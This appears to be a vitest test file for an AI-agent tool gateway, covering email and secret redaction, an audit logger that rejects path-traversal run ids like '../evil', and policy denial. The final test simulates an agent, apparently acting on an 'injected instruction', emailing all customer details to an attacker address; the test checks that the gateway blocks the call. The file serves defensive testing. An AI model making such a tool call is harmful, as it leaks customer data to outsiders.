import { describe, it, expect, beforeEach } from "vitest";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AuditEvent } from "../src/schemas";
import { redactArgs, maskEmail } from "../src/audit/redact";
import { createRunLogger, makeRunId, readTrace } from "../src/audit/logger";
import { loadStore } from "../src/tools/store";
import { tools } from "../src/tools/tools";
import { loadPolicy } from "../src/gateway/policy-config";
import { Gateway } from "../src/gateway/gateway";

describe("redaction", () => {
  it("masks an email but keeps the first letter and the domain", () => {
    expect(maskEmail("asha@example.com")).toBe("a***@example.com");
  });

  it("masks emails inside longer text", () => {
    const masked = maskEmail("please write to asha@example.com or ravi@example.com today");
    expect(masked).not.toContain("asha@");
    expect(masked).not.toContain("ravi@");
    expect(masked).toContain("@example.com");
  });

  it("replaces an email subject and body with their length", () => {
    expect(redactArgs({ to: "asha@example.com", subject: "Hello", body: "Secret text" })).toEqual({
      to: "a***@example.com",
      subject: "[redacted: 5 chars]",
      body: "[redacted: 11 chars]",
    });
  });

  it("leaves ids and amounts alone", () => {
    expect(redactArgs({ orderId: "A-1001", amountInPaise: 50000 })).toEqual({
      orderId: "A-1001",
      amountInPaise: 50000,
    });
  });

  it("hides anything that looks like a secret by its key name", () => {
    expect(redactArgs({ apiKey: "abc", password: "pw", note: "fine" })).toEqual({
      apiKey: "[redacted]",
      password: "[redacted]",
      note: "fine",
    });
  });

  it("masks emails inside nested objects and arrays", () => {
    const result = redactArgs({ people: [{ contact: "asha@example.com" }] });
    expect(JSON.stringify(result)).not.toContain("asha@");
  });

  it("does not change the original arguments", () => {
    const original = { to: "asha@example.com", subject: "Hi", body: "Hi there" };
    redactArgs(original);
    expect(original.to).toBe("asha@example.com");
    expect(original.body).toBe("Hi there");
  });
});

describe("run logger", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "veto-log-"));
  });

  const event: AuditEvent = {
    runId: "run-test",
    step: 0,
    timestamp: "2026-10-19T00:30:00.000Z",
    eventType: "run_started",
    modelId: "test-model",
    promptVersion: "v1",
    policyVersion: "v1",
  };

  it("builds a run id that is safe to use as a file name", () => {
    const id = makeRunId(new Date("2026-10-19T00:30:00.000Z"));
    expect(id).toMatch(/^run-20261019T003000Z-[0-9a-f]{6}$/);
  });

  it("writes one JSON line per event and reads them back", () => {
    const logger = createRunLogger({ dir, runId: "run-test" });
    logger.audit(event);
    logger.audit({ ...event, step: 1, eventType: "run_finished" });
    expect(readFileSync(logger.path, "utf8").trim().split("\n")).toHaveLength(2);
    expect(readTrace(logger.path).map((e) => e.eventType)).toEqual(["run_started", "run_finished"]);
  });

  it("refuses a run id that could point outside the log folder", () => {
    expect(() => createRunLogger({ dir, runId: "../evil" })).toThrow("Unsafe run id");
    expect(() => createRunLogger({ dir, runId: "a/b" })).toThrow("Unsafe run id");
  });

  it("refuses to write an event that is not valid", () => {
    const logger = createRunLogger({ dir, runId: "run-test" });
    expect(() => logger.audit({ ...event, step: -1 })).toThrow();
  });
});

describe("gateway with the real logger and the real redaction", () => {
  it("logs a blocked outside email without writing the address or the body to disk", async () => {
    const dir = mkdtempSync(join(tmpdir(), "veto-int-"));
    const ctx = loadStore({
      fixturesDir: "fixtures",
      outboxPath: join(dir, "outbox.jsonl"),
      now: () => new Date("2026-10-19T00:30:00.000Z"),
    });
    const logger = createRunLogger({ dir, runId: "run-int" });
    const gateway = new Gateway({
      tools,
      policy: loadPolicy("policy/policy.v1.json"),
      ctx,
      audit: logger.audit,
      redact: redactArgs,
      run: { runId: "run-int", modelId: "test-model", promptVersion: "v1" },
    });

    const outcome = await gateway.handle(
      {
        type: "tool_call",
        toolName: "send_email",
        args: { to: "attacker@evil.test", subject: "Data", body: "All customer details" },
        reason: "injected instruction",
      },
      0,
    );
    expect(outcome).toMatchObject({ status: "denied", decision: { ruleId: "email-domain-not-allowed" } });

    const raw = readFileSync(logger.path, "utf8");
    expect(raw).not.toContain("attacker@evil.test");
    expect(raw).not.toContain("All customer details");
    expect(raw).toContain("a***@evil.test");
    expect(raw).toContain("email-domain-not-allowed");

    const [first] = readTrace(logger.path);
    expect(first).toMatchObject({ eventType: "gateway_decision", decision: "DENY", toolName: "send_email" });
  });
});